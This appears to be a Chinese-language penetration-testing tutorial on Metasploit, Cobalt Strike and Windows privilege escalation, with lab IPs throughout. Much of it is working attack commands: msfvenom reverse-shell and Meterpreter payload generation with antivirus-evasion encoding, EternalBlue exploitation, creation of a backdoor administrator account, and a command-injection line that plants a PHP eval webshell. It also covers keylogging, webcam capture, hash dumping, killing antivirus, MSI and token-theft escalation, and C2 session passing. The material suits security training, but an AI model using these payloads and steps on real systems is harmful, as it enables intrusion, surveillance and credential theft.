# MSF

## MSF基本介绍

### MSF简介


Metasploit框架（Metasploit Framework, MSF）是⼀个开源⼯具，旨在⽅便渗透测试，它是由Ruby程序语⾔编写的模板化框架，具有很好的扩展性，便于渗透测试⼈员开发.使⽤定制的⼯具模板。

Metasploit可向后端模块提供多种⽤来控制测试的接⼝（如控制台,Web ,CLI ）。

推荐使⽤控制台接⼝，通过控制台接⼝，你可以访问和使⽤所有Metasploit的插件，例如Payload,利⽤模块,Post模块等。 

Metasploit还有第三⽅程序的接⼝，例如`Nmap`,`SQLMap` 等，可以直接在控制台接⼝⾥使⽤，要访问该界⾯。

### MSF五大模块

#### Auxiliaries（辅助模块）


该模块不会直接在测试者和⽬标主机之间建⽴访问，它们只负责执⾏扫描.嗅探.指纹识别等相关功能以辅助渗透测试。

#### Exploit（漏洞利⽤模块）

漏洞利⽤是指由渗透测试者利⽤ ⼀个系统.应⽤或者服务中的安全漏洞进⾏的攻击⾏为 。

流⾏的渗透攻击技术包括缓冲区溢出,Web应⽤程序攻击，以及利⽤配置错误等，

其中包含攻击者或测试⼈员针对系统中的漏洞⽽设计的各种POC验证程序，⽤于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码 。

#### Payload（攻击载荷模块）

攻击载荷是我们期望⽬标系统在被渗透攻击之后完成实际攻击功能的代码，

成功渗透⽬标后，⽤于在⽬标系统上运⾏任意命令或者执⾏特定代码，在Metasploit框架中可以⾃由地选择.传送和植⼊ 。

攻击载荷也可能是简单地在⽬标操作系统上执⾏⼀些命令，如添加⽤户账号等 。

#### Post（后期渗透模块）

该模块主要⽤于在取得⽬标系统远程控制权后，进⾏⼀系列的后渗透攻击动作，如获取敏感信息.实施跳板攻击等。

#### Encoders（编码⼯具模块）


该模块在渗透测试中负责免杀，以防⽌被杀毒软件,防⽕墙, IDS及类似的安全软件检测出来。

## MSF一些基本命令

### MSF的启动

`msfconsole`：启动MSF框架

`exit`：退出MSF框架。也可以使用快捷键 `CTRL+\`

`back`：退出到上一级。

`apt-get update`：同步 `/etc/apt/sources.list` 和 `/etc/apt/sources.list.d` 中列出的源的索引，这样才能获取到最新的软件包。

`apt-get upgrade`：使用该命令前要先使用update。升级系统上安装的所有软件包,若更新失败，所涉及的包会保持更新之前的状态

上述的升级是比较全面且彻底的。但是要花费较多时间。建议在空闲时间使用，如果急需使用MSF又需要更新。

建议采用单独升级的方式，先使用 apt update 再使用 `apt install metasploit-framework`

#### MSF实操练习

- 1.打开kali的终端，输入`msfconsole`，进入msf框架
- 2.输入命令`exit`退出MSF框架，来进行框架升级。
- 3.使用MSF之前，最好将其更新，以获取更多漏洞模块的支持。先使用`apt update`再使用 `apt install metasploit-framework`
- 4.更新完成后，再次打开msf

```python
msfconsole
exit
apt update
apt install metasploit-framework
```

### MSF的功能


MSF框架可以用来主机扫描.漏洞探测与漏洞利用,生成后门

#### 1.主机扫描

##### 1.1  使用辅助模块进行端口扫描

（1）  利用`search portscan`命令查询一下有哪些可用的端口扫描模块

```python
search portscan
```

（2）  在上述结果中，可以看到有8个可用的端口扫描模块，此处以tcp端口扫描模块为例进行扫描。

输入命令`use auxiliary/scanner/portscan/tcp` 进入对应模块（看>号前面的内容就知道自己所处模块位置）

再输入 `show options`查询对应模块需要使用的参数

```python
use auxiliary/scanner/portscan/tcp
show options
```

（3） 在上述参数中，`Required`列，被标记为`yes`的参数必须包含实际的值

其中，除了`RHOSTS`外，其余参数均有默认值。

`THREADS`设置扫描线程数量，默认为`1`，数量越高扫描越快。

使用`set`命令设置某个参数值，可以使用`unset`命令取消某个参数值的设置

设置完毕后使用`run`命令执行模块

```python
set rhosts 192.168.70.10
set threads 5
run
```

可以看到扫描结果如下，445端口存在可能利用的**永恒之蓝漏洞**。

##### 1.2  使用辅助模块进行服务扫描

（1）使用命令`search scanner`可以发现大量的扫描模块，有600多个模块

```python
search scanner
```

（2）使用`search`搜索与`SMB`服务相关的模块，搜索结果如下。使用的步骤与使用端口扫描模块时的基本相同

```python
search SMB
```

##### 1.3使用NMAP扫描

#### 2.漏洞探测与漏洞利用

##### 2.1 漏洞探测


（1）我们就拿永恒之蓝为例，在上述信息收集中，我们**发现445端口开启**，**代表着目标靶机运行SMB服务**，因此使用命令`search ms17_010`查询与永恒之蓝相关的可利用模块。

（2）端口开启不代表就存在永恒之蓝漏洞，因此我们还需要借助更具体的扫描模块来检验是否存在永恒之蓝漏洞，使用命令`use auxiliary/scanner/smb/smb_ms17_010`  进入永恒之蓝漏洞扫描模块，输入参数`show options`  查看所需参数。

（3）设置必要参数然后运行该模块，发现该主机可能存在`MS17_010`漏洞。

```python
search ms17_010
use auxiliary/scanner/smb/smb_ms17_010
show options
set rhosts 192.168.70.10
run
```

##### 2.2 漏洞利用

（1）我们经过漏洞发现已知该主机可能存在`MS17_010`漏洞，下一步就是进行漏洞利用。

使用`use exploit/windows/smb/ms17_010_eternalblue` 进入漏洞利用模块，输入参数`show options` 查看所需参数。


（2）设置`RHOSTS`参数，然后进行漏洞利用。


（3）`GetShell`。输入命令`shell`来让靶机反弹shel到当前窗口。


创建用户并提权为管理员。

创建用户：`net user user 123456 /add`

把创建的user用户加到管理员组：`net localgroup /add administrators user`

```python
use exploit/windows/smb/ms17_010_eternalblue
show options
set rhosts 192.168.70.10
run
shell

net user user 123456 /add
net localgroup /add administrators user
```

### MSF生成木马

#### 1.普通生成

```python
msfvenom -p 有效载荷 lhost=攻击机IP lport=攻击机端口 -f 输出格式 -o 输出文件

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=8888 -f exe -o payload.exe
```

#### 2.编码生成

```python
msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 lhost=攻击机IP lport=攻击机端口 -e 编码方式 -i编码次数 -f 输出格式 -o 输出文件

msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=8888 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe
```




```bash
msfvenom --list archs 		#查看支持的系统架构
msfvenom --list platforms 	#查看支持系统平台
msfvenom -l payload 		#列出所有可用的payload
msfvenom -l formats 		#列出所有的输出格式
msfvenom -l encrypt 		#列出所有的加密方式
msfvenom -l encoders 		#列出所有的编码器
```
#### 3.常见生成格式

##### 1.Windows

```bash
msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i -e x86/shikata_ga_nai -f exe -o payload.exe
```

##### 2.Linux

```bash
msfvenom --platform linux -a x86 -p linux/x86/meterpreter/reverse_tcp -f elf -o payload.elf 
```

##### 3.Mac

```bash
msfvenom --platform osx -a x86 -p osx/x86/shell_reverse_tcp -f macho -o payload.macho   
```

##### 4.Android

```python
msfvenom -p android/meterpreter/reverse_tcp -o payload.apk 
```

##### 5.Aspx

```bash
msfvenom --platform windows-p windows/meterpreter/reverse_tcp -f aspx -o payload.aspx
```

##### 6.JSP

```bash
msfvenom --platform java -p java/jsp_shell_reverse_tcp -f raw -o payload.jsp 
```

##### 7.PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp -f raw -o payload.php
```

##### 8.BASH

```bash
msfvenom -p cmd/unix/reverse_bash -f raw -o shell.sh  
```

##### 9.Python

```bash
msfvenom -p python/meterpreter/reverse_tcp -f raw -o shell.py
```

### MSF使用示例

#### 1.生成木马文件

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.70.4 LPORT=8088 -b "\x00" -i 10 -f exe -o /root/tools/msf/8088.exe

参数含义：
-a x86                                  #使用x86框架
--platform windows                      #运行平台为windows
 -p windows/meterpreter/reverse_tcp      #指定payload
LHOST=192.168.21.128 LPORT=8088         #本地IP和监听端口
-b "\x00"                               #去掉坏字符
-i 10                                   #编码10次，提高免杀概率
-f exe                                  #木马文件格式
-o /root/1.exe                          #输出路径
```
![image-20241009090726558](https://image.201068.xyz/assets/38.后渗透/image-20241009090726558.png)2.启动监听程序

```bash
msfconsole
use exploit/multi/handler                    
set payload windows/meterpreter/reverse_tcp  
set lhost 192.168.70.4
set lport 8088                              
exploit
```

![image-20241009091113749](https://image.201068.xyz/assets/38.后渗透/image-20241009091113749.png)

#### 3.靶机上线

![image-20241009091155418](https://image.201068.xyz/assets/38.后渗透/image-20241009091155418.png)

![image-20241009091138655](https://image.201068.xyz/assets/38.后渗透/image-20241009091138655.png)

接下来是利用漏洞获取更多的靶机信息并进一步扩大施展空间。

```python
screenshot							    靶机屏幕截屏并保存到root中
sysinfo 								获取靶机系统信息
idletime: 								靶机开机时间
run post/windows/manage/enable_rdp		  打开远程桌面服务
run post/windows/manage/killav			  关闭杀毒软件
run hashdump 							查看系统账户密码的hash值
shell									获取shell  
```
##### shell相关命令

```python
getuid      查看当前权限
getsystem   尝试获取system权限
shell       获取当前权限shell会话
ps          列出正在运行的进程
pkill       按名称终止进程
kill        按PID终止进程
reboot      重启
shutdown    关机
upload      上传文件(格式参考:upload /root/1.txt -> d:/)
download    下载文件(格式参考:download c:/1.txt -> /root/)

keyboard_send   令对方键盘输入(参考格式:keyboard_send ilovecc)
keyscan_start   开始捕获击键（开始键盘记录）
keyscan_dump    转储按键缓冲（下载键盘记录）
keyscan_stop    停止捕获击键（停止键盘记录）

record_mic      麦克风录制
screenshot      截图截取对方目前桌面的截图
webcam_snap     摄像头拍摄一张照片
webcam_stream   持续监控摄像头
getpid          查看meterpreter shell的进程号
migrate +稳定进程号 	转移进程
  也可以直接用run post/windows/manage/migrate进行自动寻找稳定进程转换。
```

### msf会话转移至cs

#### msf转移会话

##### 1.cs开启http监听端口

![image-20241009090438364](https://image.201068.xyz/assets/38.后渗透/image-20241009090438364.png)

##### 2.msf进行会话转移

```python
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.70.4 LPORT=8888 -f exe -o /root/tools/msf/8888.exe
```

![image-20241009093052872](https://image.201068.xyz/assets/38.后渗透/image-20241009093052872.png)

```python
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.70.4
set lport 8888
run
```

![image-20241009093441516](https://image.201068.xyz/assets/38.后渗透/image-20241009093441516.png)

```python
background
sessions
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set lhost 192.168.70.4
set lport 6003
set DisablePayloadHandler true
set PrependMigrate True
set session 1
run
```

![image-20241009093620861](https://image.201068.xyz/assets/38.后渗透/image-20241009093620861.png)

![image-20241009093645801](https://image.201068.xyz/assets/38.后渗透/image-20241009093645801.png)

# CS基础介绍

## Cobalt Strike 后渗透工具

### 介绍

Cobalt Strike 一款以Metasploit为基础的GUI框架式渗透测试工具，集成了**端口转发.服务扫描，自动化溢出，多模式端口监听，exe.powershell木马生成**等。

**钓鱼攻击包括**：站点克隆，目标信息获取，java执行，浏览器自动攻击等。

Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。


Cobalt Strike 作为一款协同APT工具，针对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。

### 基本功能

#### 安装运行

Cobalt Strike 分为客户端和服务端，可分布式操作.协同作战。服务器端只能运行在Linux系统中，可搭建在VPS上。

#### 服务端

服务端关键的文件是teamserver以及cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行：

```python
chmod +x teamserver
#赋予执行权限

./teamserver 192.168.2.112 123456
 #服务器真实IP（不能使用0.0.0.0或127.0.0.1）和连接密码
```

#### 客户端

客户端在Windows.Linux.Mac下都可以运行 (需要配置好Java环境)。启动Cobalt Strike客户端，输入服务端的IP以及端口.连接密码，用户名可以任意设置。

```python
./start.bat
#启动cs
```

在控制台所有操作指令都会被记录保留在Cobalt Strike目录logs下。

### stageing:（分阶段传输）

- 
  stager：shellcode加载器，用来请求并加载stage

- 
  stage：shellcode文件


### DNS上线


域名分别添加两条解析记录

- A记录的值为CS服务端IP

- 
  NS记录的值是A记录添加后的域名



在 Cobalt Strike 添加 DNS 监听器，DNS Hosts 填写 NS 记录

使用 DNS 监听器生成木马，建议生成无状态木马（不分段传输）


将木马放到靶机运行，稍等片刻后即可看到有主机上线，但是是一个黑框


在终端输入 checkin 或者任意命令即可看到主机信息

### SMB上线

- 
  要求：已拿到目标主机上传和执行的权限.目标主机放行445端口.知道目标主机的用户名和密码信息

- 使用场景：目标主机不出网，且已知目标主机用户名和密码进行上线

| 机器           | 类型    | IP            |
| -------------- | ------- | ------------- |
| 攻击机         | kali    | 192.168.70.4  |
| 已拿到权限靶机 | win10   | 192.168.70.10 |
| 不出网机器     | win2012 | 192.168.70.21 |

#### Cobalt Strike 新建 SMB 监听器

![image-20241008163127855](https://image.201068.xyz/assets/38.后渗透/image-20241008163127855.png)

![image-20241008163225205](https://image.201068.xyz/assets/38.后渗透/image-20241008163225205.png)

#### 使用 SMB 监听器生成无状态木马

![image-20241008165135505](https://image.201068.xyz/assets/38.后渗透/image-20241008165135505.png)

![image-20241008165014854](https://image.201068.xyz/assets/38.后渗透/image-20241008165014854.png)

![image-20241008165106591](https://image.201068.xyz/assets/38.后渗透/image-20241008165106591.png)

#### 开始上线

##### smb木马运行

将smb木马放到win2012靶机运行

![image-20241008171152609](https://image.201068.xyz/assets/38.后渗透/image-20241008171152609.png)

##### 制作令牌和连接SMB木马

在能和靶机连通的win10会话中**制作令牌**和**连接SMB木马**

```python
shell ipconfig /all
shell ping 192.168.70.21

make_token win2012 win2012
link 192.168.70.21
```

![image-20241008170259645](https://image.201068.xyz/assets/38.后渗透/image-20241008170259645.png)

![image-20241008170430131](https://image.201068.xyz/assets/38.后渗透/image-20241008170430131.png)

![image-20241008171323845](https://image.201068.xyz/assets/38.后渗透/image-20241008171323845.png)

##### 断开连接

在刚才的会话中输入如下命令即可

```python
unlink 192.168.70.21
```

![image-20241008171657763](https://image.201068.xyz/assets/38.后渗透/image-20241008171657763.png)

### TCP上线

- 使用场景：目标主机不出网，已拿到目标主机上传和执行的权限时进行上线


#### Cobalt Strike 新建 TCP 监听器

![image-20241008172318194](https://image.201068.xyz/assets/38.后渗透/image-20241008172318194.png)

#### 使用 TCP 监听器生成无状态木马



![image-20241008172346143](https://image.201068.xyz/assets/38.后渗透/image-20241008172346143.png)

![image-20241008173418540](https://image.201068.xyz/assets/38.后渗透/image-20241008173418540.png)

#### 将木马放到win2012靶机运行

![image-20241008173459051](https://image.201068.xyz/assets/38.后渗透/image-20241008173459051.png)

#### 在能和靶机连通的win10会话中输入命令

```python
connect 192.168.70.21 6002
```

![image-20241008173607670](https://image.201068.xyz/assets/38.后渗透/image-20241008173607670.png)

### Cobalt Strike 会话转移到 msf

在 Cobalt Strike **新建监听器**，

payload 选择 `Foreign HTTP` 或者 `Foreign HTTPS`

Host填写 `msf` 的 IP，端口自定义即可

![image-20241009094006807](https://image.201068.xyz/assets/38.后渗透/image-20241009094006807.png)


设置完成后启动 msf ,然后执行以下命令

```python
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.70.4
set lport 6004
run
```

> - lhost msf的ip
> - lpost cs监听器设置的端口

![image-20241009094210885](https://image.201068.xyz/assets/38.后渗透/image-20241009094210885.png)

返回 Cobalt Strike 选择**要转移的会话**，右键选择**增加会话**，选择刚才创建的监听器即可

![image-20241009094400105](https://image.201068.xyz/assets/38.后渗透/image-20241009094400105.png)

![image-20241009094442079](https://image.201068.xyz/assets/38.后渗透/image-20241009094442079.png)

![image-20241009094508106](https://image.201068.xyz/assets/38.后渗透/image-20241009094508106.png)

## Cobalt Strike 参数介绍

##### Cobalt Strike

```python
New Connection
#新的连接(支持连接多个服务器端)

Preferences
#偏好设置(设置Cobal Strike界面.控制台.以
及输出报告样式.TeamServer连接记录等)


Visualization
#窗口视图模式(展示输出结果的形式)


VPN Interfaces
#VPN接入


Listenrs
#监听器(创建Listener)


Script Manager
#脚本管理

Close
#关闭



Visualization


Privot Graph
#枢纽视图（可以显示各个目标的关系）

Session Table
#会话列表

Target Table
#目标列表
```

##### View

```python
View
#视图

Applications
#应用信息(显示受害者机器的应用信息)


Credentials
#凭证信息(通过hashdump或Mimikatz抓取过的
密码都会储存在这里)


Downloads
#下载文件

Event Log
#事件日志(主机上线记录以及团队协作聊天记录)


Keystrokes
#键盘记录

Proxy Pivots
#代理模块

Screenshots
#截图

Script Console
#脚本控制台(可以加载各种脚本，增强功能）


Targets
#显示目标主机


Web Log
#Web日志
```

##### Attacks

```python
Attacks
攻击

Packages
#生成后门

Web Drive-by
#钓鱼攻击

Spear Phish
#邮件攻击


Packages
#生成后门

HTML Application
#生成恶意的HTA木马文件


MS Office Macro
#生成office宏病毒文件


Payload Generator
#生成各种语言版本的payload


Windows Executable
#生成可执行Payload


Windows Executable(S)
#把包含payload,Stageless生成可执行文件(包含多数功能)




Web Drive-by
#钓鱼攻击

Manage
#对开启的web服务进行管理


Clone Site
#克隆网站(可记录受害者提交的数据)


Host File
#提供Web以供下载某文件


Scripted Web Delivery（S）
#提供Web服务，便于下载和执行PowerShell 
Payload，类似于Metasploit的web_delive


Signed Applet Attack
#启动一个Web服务以提供自签名Java Applet的
运行环境

Smart Applet Attack
#自动检测Java版本并利用已知的exploits绕过security


System Profiler
#用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等
```

##### Reporting

```python
Reporting
#报告

Activity report
#活动报告

Hosts report
#主机报告

Indicators of Compromise
#威胁报告

Sessions report
#会话报告

Social engineering report
#社会工程学报告

Tactics, Techniques, and Procedures

#策略.技巧和程序

Reset Data
#重置数据

Export Data
#导出数据
```

##### Help

```python
Help
#帮助

Homepage
#官方主页

Support
#技术支持

Arsenal
#开发者

System information
#版本信息

About
#关于
```

##### 菜单栏视图


```python
1.新建连接
2.断开当前连接
3.监听器
4.改变视图为Pivot Graph(可以显示各个目标的关系)
5.改变视图为Session Table(会话列表)
6.改变视图为Target Table(目标列表)
7.查看凭据信息a
8.查看文件下载
9.查看键盘记录
10.查看屏幕截图
11.生成无状态Beacon后门
12.java自签名程序攻击
13.生成office宏后门
14.生成脚本通过web传递(利用powershell，bitsadmin，regsvr32生成会话)
15.在Cobalt Strike的web服务上托管一个文件(提供一个文件下载)
16.管理Cobalt Strike上运行的web服务
17.帮助
18.关于
```



# Windows权限提升

## 权限提升

提权是指把普通用户的权限进行提升，也叫特权提升，在渗透测试中，通常是利用各种漏洞来提升webshell权限以夺得服务器权限。

## 一.系统内核漏洞提权

当目标系统存在该漏洞且没有更新安全补丁时，利用已知的系统内核漏洞进行提权，我们往往可以获得系统级别的访问权限。

### 实验环境

| 机器   | 类型    | IP            |
| ------ | ------- | ------------- |
| 攻击机 | kali    | 192.168.70.4  |
| 靶机   | win2012 | 192.168.70.28 |

#### 前期拿低权限

http://192.168.70.28/vul/rce/rce_ping.php

```python
127.0.0.1|echo "<?php @eval($_POST["xxx"]);?>"  > xxx.php
```

蚁剑连接

```python
http://192.168.70.28/vul/rce/xxx.php
xxx
```

![image-20241009111927444](https://image.201068.xyz/assets/38.后渗透/image-20241009111927444.png)

### 1.1.查找系统潜在漏洞

#### 1.1.1.手动寻找可用漏洞

##### 查看已安装的系统补丁

```python
systeminfo
```

![image-20241009112016910](https://image.201068.xyz/assets/38.后渗透/image-20241009112016910.png)

![image-20241009112143806](https://image.201068.xyz/assets/38.后渗透/image-20241009112143806.png)

我们可以通过没有列出的补丁号，结合系统版本等信息，借助相关提权辅助网站，

如： 提权辅助网页寻找可用的提权漏洞.

##### 提权辅助网页

- https://gh0st.cn/AssistTool
- https://i.hacking8.com/tiquan

如 MS18-8120与KB4131188对应,CVE-2020-0787 与KB4540673对应等。

#### 1.1.2.借助 WES-NG 查找可用漏洞

`Windows Exploit Suggester` 项目最初由GDS Security 于 2014 年发布，根据操作系统版本与 `systeminfo` 命令的执行结果进行对比，来查找可用的提权漏洞。

`Windows Exploit Suggester` 在 `Windows XP/Vista` 操作系统上运行良好，但不适用于Windows 11 等新版操作系统和近年来发布的新漏洞。

这是因为该工具完全依赖于Microsoft 安全公告数据Excel 文件，而该文件自2017年第一季度以来就从未更新过。

于是，`WES-NG` 应运而生，其全称为 `Windows Exploit Suggester - Next Generation`,

由安全研究员 `Arris Huijgen` 基于 `Window Exploit Suggester` 创建的新一代 Windows 系统辅助提权工具

##### WES-NG 项目地址

https://github.com/bitsadmin/wesng

```python
pip install wesng

git clone https://github.com/bitsadmin/wesng --depth 1

wes --update
```

##### WES-NG使用方法

① 在本地主机上执行以下命令，更新最新的漏洞数据库

```python
python wes.py  --update
```

② 在目标主机上执行 `systeminfo` 命令，并将执行结果保存到 `systeminfo.txt` 中。

![image-20241009112844361](https://image.201068.xyz/assets/38.后渗透/image-20241009112844361.png)

然后下载systeminfo.txt，使用 WES-NG 进行检查即可

```python
python wes.py systeminfo.txt --impact "Elevation of Privilege"
```

>  `--impact` 指定漏洞类型为提权漏洞

![image-20241009113239482](https://image.201068.xyz/assets/38.后渗透/image-20241009113239482.png)

③ 执行以下命令，查找所有已公开 EXP 的提权漏洞

```python
python wes.py systeminfo.txt --impact "Elevation of Privilege" --exploits-only
```

![image-20241009113429556](https://image.201068.xyz/assets/38.后渗透/image-20241009113429556.png)

##### EXP收集地址：

提权漏洞大合集，各种提权漏洞利用工具：

https://github.com/Ascotbe/Kernelhub/tree/master/Windows

### 1.2.使用metasplit 提权

metasplit 是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。

团队合作，在Metasploit和综合报告提出了他们的发现。

#### 1.2.1.提权过程

```python
msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.70.4 LPORT=8888 -f exe -o msf_8888.exe
```

![image-20241009135828723](https://image.201068.xyz/assets/38.后渗透/image-20241009135828723.png)

#### 1.2.2.把生成的后门文件上传到可执行目录

![image-20241009140202379](https://image.201068.xyz/assets/38.后渗透/image-20241009140202379.png)

#### 1.2.3.启动 metasplite

在kali上 使用 msfconsole 命令 

```python
msfconsole
```

#### 1.2.4.设置设置参数

监听ip和端口，这里的ip和端口要生成后门的端口和ip一致。

```python
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.70.4
set lport 8888
exploit
```

#### 1.2.5.获取系统信息

获取系统信息和当前账号发现权限较低， 需要进行提权。

![image-20241009140515337](https://image.201068.xyz/assets/38.后渗透/image-20241009140515337.png)

```python
getuid
```

![image-20241009140541105](https://image.201068.xyz/assets/38.后渗透/image-20241009140541105.png)

#### 1.2.6.搜索漏洞模块

```python
background
search ms16_075
```

![image-20241009140957546](https://image.201068.xyz/assets/38.后渗透/image-20241009140957546.png)

#### 1.2.7.使用模块进行提权

```python
use exploit/windows/local/ms16_075_reflection_juicy
show options
set payload windows/meterpreter/reverse_tcp
set session 1
run
```

![image-20241009141127656](https://image.201068.xyz/assets/38.后渗透/image-20241009141127656.png)

#### 1.2.8.提权成功

```python
getuid
```

![image-20241009141053935](https://image.201068.xyz/assets/38.后渗透/image-20241009141053935.png)

#### 识别系统可能存在的本地提权漏洞

也可以使用 `use post/multi/recon/local_exploit_suggester` 识别系统可能存在的本地提权漏洞

```python
background
use post/multi/recon/local_exploit_suggester
show options
set session 1
run
```

![image-20241009141419357](https://image.201068.xyz/assets/38.后渗透/image-20241009141419357.png)

## 二. MSI安装策略提权

MSI安装策略提权是由于用户在配置MSI安装策略时，启用了“**永远以高特权进行安装**”（`AlwaysInstallElevated`，默认情况下为禁用状态），使得任何权限的用户都可以通过SYSTEM权限安装MSI程序。

此时可以在目标主机上安装一个预先制作的恶意MSI文件，以获得`SYSTEM`权限。

MSI 全称为 `Microsoft Installer`，是微软格式的应用程序安装包，实际上是一个数据库，包含安装和卸载软件时需要使用的大量指令和程序数据。

### 2.1. 确定系统是否存在漏洞

成功利用该方法提权的关键是用户在配置MSI安装策略时启用了“永远以高特权进行安装”。

该选项启用后，系统会自动在注册表的以下两个位置创建键值“`1`”。

```python
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
HKET_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

#### 先连接一个**低权限木马**

> 不能是服务账户，需要是可交互的普通用户
>
> apache / Qwe.123

##### 生成木马

```python
msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.70.4 LPORT=8888 -f exe -o msf_8888.exe
```

监听木马

```python
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.70.4
set lport 8888
exploit
```

##### 或者使用已有会话

```python
sessions -i 1
getuid
```

![image-20241009142038732](https://image.201068.xyz/assets/38.后渗透/image-20241009142038732.png)

#### 查看注册表键值

执行以下命令，通过查看注册表键值来确定目标系统是否开启了 `AlwayslnstallElevated` 选项

```python
shell
chcp 65001

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

![image-20241009142226571](https://image.201068.xyz/assets/38.后渗透/image-20241009142226571.png)

### 2.2 创建恶意 MSI 并安装

#### 生成 MSI木马


确定目标系统存在该漏洞后，使用 MetaSploit 自动生成 MSI

```python
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.4 LPORT=6666 -f msi -o 6666.msi
```

![image-20241009142519478](https://image.201068.xyz/assets/38.后渗透/image-20241009142519478.png)

#### 监听连接

```python
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.70.4
set lport 6666
exploit
```

![image-20241009143359880](https://image.201068.xyz/assets/38.后渗透/image-20241009143359880.png)

#### 上传MSI 文件

在现有的 MetaSploit  会话中将创建的 MSI 文件上传到目标计算机

通过 `msiexec`  **运行 MSI 安装文件**，最终提权

```python
exit
upload /root/tools/msf/6666.msi 6666.msi

shell
chcp65001
msiexec /quiet /qn /i 6666.msi
```

![image-20241009142731721](https://image.201068.xyz/assets/38.后渗透/image-20241009142731721.png)

![image-20241009143201877](https://image.201068.xyz/assets/38.后渗透/image-20241009143201877.png)

> **服务账户**不能运行安装 ，需要切换到apache普通用户
>
> apache / qwe.123

![image-20241009143832439](https://image.201068.xyz/assets/38.后渗透/image-20241009143832439.png)

![image-20241009144315542](https://image.201068.xyz/assets/38.后渗透/image-20241009144315542.png)

## 三.访问令牌操纵

Windows 操作系统的访问控制模型 (Access Control Model) 是 Windows 系统安全性的基础构件，由访问令牌（Access Token) 和安全描述符（Security Descriptor）两部分组成，二者分别被访问者和被访问者所持有。

通过比较访问令牌和安全描述符的内容，Windows 可以对访问者是否拥有访问资源对象的能力进行判定。

### 3.1.访问令牌

访问令牌是描述进程或线程安全上下文的对象，包含与进程关联的用户账户的标识和特权等信息。

系统使用访问令牌来控制用户可以访问的安全对象，并限制用户执行相关系统操作的能力。

当用户登录时，系统将对用户进行身份验证，如果验证通过，就会为用户创建一个访问令牌，包括登录过程返回的 `SID` 以及由本地安全策略分配给用户和用户所属安全组的特权列表。

此后，代表该用户执行的每个进程都有此访问令牌的副本，每当线程或进程与安全对象交互或尝试执行需要特权的系统任务，系统都会使用此访问令牌标识并确定关联的用户。

通过操纵访问令牌，使正在运行的进程看起来是其他进程的子进程或属于其他用户所启动的进程。

这常常使用内置的 Windows API 从指定的进程中复制访问令牌，并将得到的访问令牌用于现有进程或生成新进程，以达到权限提升并绕过访问控制的目的。这个过程被称为令牌窃取。

> 注意，令牌窃取只能在特权用户上下文中才能完成，因为通过令牌创建进程使用的 `CreateProcessWithTokenW`（创建一个新进程及其主线程，新进程在指定令牌的安全上下文中运行） 和 `CreateProcessAsUserA`（创建一个新进程及其主线程，新进程在由指定令牌表示的用户的安全上下文中运行） 
>
> 两个 Windows API 分别要求用户必须拥有 `SelmpersonatePrivilege`（又称为“模拟客户端的安全上下文”权限,它允许一个进程模拟另一个用户的安全上下文,以该用户的身份访问资源） 和 `SeAssignPrimaryTokenPrivilege/SelncreaseQuotaPrivilege`（又称为“替换进程级访问令牌”权限,它允许一个进程申请替换另一个进程的访问令牌,从而改变目标进程的用户和权限）特权，
>
> 而拥有这两个特权的用户一般为系统管理员账户.网络服务账户和系统服务账户。

### 3.2 利用 MSF 窃取令牌

#### 环境准备

- 需要**管理员组级别的权限**，一般配合烂土豆使用，可实现**低权限**提权

> administrator / Qwe.123

```python
msfconsole
use exploit/multi/handler
show optoions
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.70.4
set lpost 8888
run

getuid
```

![image-20241009144958558](https://image.201068.xyz/assets/38.后渗透/image-20241009144958558.png)

![image-20241009145223732](https://image.201068.xyz/assets/38.后渗透/image-20241009145223732.png)

![image-20241009145247773](https://image.201068.xyz/assets/38.后渗透/image-20241009145247773.png)

#### 使用`incohnito` 模块 

MetaSploit 渗透测试框架内置了一个 `incohnito` 模块，可以在现有的 Meterpreter 中运行令牌窃取等操作，使用方法如下

```python
load incognito   						#加载 incognito 模块
list_tokens -u   						#列出主机上的所有访问令牌
impersonate_token "NT AUTHORITY\SYSTEM" 	#窃取 NT AUTHORITY\SYSTEM 账户的令牌

steal_token PID 						 #从指定的进程窃取令牌
rev2self  								#退回之前的令牌
```

![image-20241009145552711](https://image.201068.xyz/assets/38.后渗透/image-20241009145552711.png)

### 3.3 Potato 家族提权

在渗透实战中，Potato 家族是一种十分常用的提权技术，通过操纵访问令牌，可以将已获取的Windows 服务账户权限提升至系统SYSTEM权限。

前面讲过，使用**令牌窃取**的前提是用户拥有 `SeAssignPrimaryTokenPrivilege` 或`SelmpersonatePrivilege` 特权。

这两个特权非常强大，允许用户在另一个用户的安全上下文中运行代码甚至创建新**进程**。

